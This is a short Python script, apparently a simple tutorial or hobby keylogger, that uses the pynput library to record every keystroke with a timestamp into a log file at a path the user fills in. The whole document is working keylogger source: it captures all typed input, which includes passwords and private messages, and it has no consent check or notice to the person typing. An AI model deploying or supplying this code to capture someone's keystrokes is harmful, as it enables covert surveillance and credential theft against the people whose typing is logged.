from pynput.keyboard import Key, Listener #To collect data
import logging #To log the infos collected

path = "DESIRED/PATH/HERE" #Put your desired path here

#Config of logging lib
logging.basicConfig(filename = (f"{path}/logfile.txt"),
                                level = logging.DEBUG, format = '%(asctime)s : %(message)s')

def keypress(Key):
    logging.info(str(Key))

with Listener(on_press = keypress) as listener:
    listener.join()